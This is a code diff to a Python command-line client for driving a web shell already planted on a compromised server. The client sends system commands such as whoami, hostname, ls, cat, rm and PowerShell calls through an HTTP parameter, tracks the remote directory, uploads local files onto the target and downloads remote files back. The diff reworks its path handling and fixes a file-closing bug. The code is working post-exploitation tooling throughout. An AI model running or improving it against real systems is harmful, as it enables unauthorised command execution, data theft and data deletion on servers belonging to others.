@@ -1,5 +1,5 @@
 #!/usr/bin/python3
-import sys
+import sys, os
 import requests
 import readline
 import argparse
@@ -42,15 +42,15 @@ try:
     WEBSHELL = args.url
     HTTP_METHOD = args.method
     PARAM = args.param
+    COMMAND_LIST = ["ls", "dir", "cat", "type", "rm", "del", "file"]
     whoami = send_command('whoami', WEBSHELL, HTTP_METHOD, PARAM)
     hostname = send_command('hostname', WEBSHELL, HTTP_METHOD, PARAM)
-    uname = send_command('uname', WEBSHELL, HTTP_METHOD, PARAM)
-    if uname:
+    cwd = "" ; slash = '\\'
+    if not slash in whoami:
        path = send_command('pwd', WEBSHELL, HTTP_METHOD, PARAM)
        slash = '/'
     else:
        path = send_command('(pwd).path', WEBSHELL, HTTP_METHOD, PARAM)
-       slash = '\\'
 
     while True:
        try:
@@ -67,8 +67,10 @@ try:
                 localfile = command.split()[1]
                 remotefile = command.split()[2]
                 if not slash in remotefile:
-                   remotefile = path + slash + command.split()[2] 
-                print (colored("Uploading file "+ localfile +" on "+ remotefile +"..\n", "yellow"))
+                   remotefile = path.rstrip() + slash + command.split()[2] 
+                if not slash in localfile:
+                   cwd = os.getcwd()
+                print (colored("Uploading file "+ cwd + slash + localfile +" on "+ remotefile +"..\n", "yellow"))
                 f = open(localfile, "r")
                 rawfiledata = f.read()
                 upload = send_command("echo " + rawfiledata.rstrip() + (' > ') + remotefile, WEBSHELL, HTTP_METHOD, PARAM)
@@ -77,12 +79,14 @@ try:
                    remotefile = command.split()[1]
                    localfile = command.split()[2]
                    if not slash in remotefile:
-                      remotefile = path + slash + command.split()[1] 
-                   print (colored("Downloading file "+ remotefile +" on "+ localfile +"..\n", "yellow"))
+                      remotefile = path.rstrip() + slash + command.split()[1]
+                   if not slash in localfile:
+                      cwd = os.getcwd()
+                   print (colored("Downloading file "+ remotefile +" on "+ cwd + slash + localfile +"..\n", "yellow"))
                    download = send_command("cat " + remotefile, WEBSHELL, HTTP_METHOD, PARAM)
                    f = open(localfile, "w")
                    f.write(download)
-                   f.close
+                   f.close()
                 else:
                    if "cd" in command.split()[0]:
                       if ".." in command.split()[1]:
@@ -90,32 +94,35 @@ try:
                          path = (slash.join(path))
                       else:
                          if not slash in command.split()[1]:
-                            path = path + slash + command.split()[1]
+                            path = path.rstrip() + slash + command.split()[1]
                          else:
                             path = command.split()[1]   
                    else:
-                      if "ls" in command.split()[0] or "dir" in command.split()[0]:
-                         if slash in command:
-                            content = send_command(command, WEBSHELL, HTTP_METHOD, PARAM)
-                            print (colored(content, "yellow"))
-                         else:
-                            content = send_command(command + " " + path.rstrip(), WEBSHELL, HTTP_METHOD, PARAM)
-                            print (colored(content, "yellow"))
+                      if command.split()[0] in COMMAND_LIST:
+                        command_array = command.split(" ")
+                        param = ""
+                        for i in list(command_array):
+                            if i.startswith("-"):
+                                param += i + " "
+                                command_array.remove(i)
+                        cmd = command_array.pop(0)
+                        if len(command_array) == 0:
+                            relative_path = ""
+                        else:
+                            relative_path = command_array[0]
+                        if not relative_path.startswith(slash):
+                          command = cmd + " " + param + path.rstrip() + slash + relative_path
+
+                        content = send_command(command, WEBSHELL, HTTP_METHOD, PARAM)
+                        print (colored(content, "yellow"))
+
                       else:
-                         if "cat" in command.split()[0] or "type" in command.split()[0]:
-                            if slash in command:
-                               content = send_command(command, WEBSHELL, HTTP_METHOD, PARAM)
-                               print (colored(content, "yellow"))
-                            else:
-                               content = send_command(command.split()[0] + " " + path.rstrip() + slash + command.split()[1], WEBSHELL, HTTP_METHOD, PARAM)
-                               print (colored(content, "yellow"))
-                         else:
-                            if args.ps:
-                               content = send_command("powershell " + command, WEBSHELL, HTTP_METHOD, PARAM)
-                               print (colored(content, "yellow"))
-                            else:
-                               content = send_command(command, WEBSHELL, HTTP_METHOD, PARAM)
-                               print (colored(content, "yellow"))
+                        if args.ps:
+                           content = send_command("powershell " + command, WEBSHELL, HTTP_METHOD, PARAM)
+                           print (colored(content, "yellow"))
+                        else:
+                           content = send_command(command, WEBSHELL, HTTP_METHOD, PARAM)
+                           print (colored(content, "yellow"))
 
        except KeyboardInterrupt:
           print (colored("\nExiting..\n", "red"))
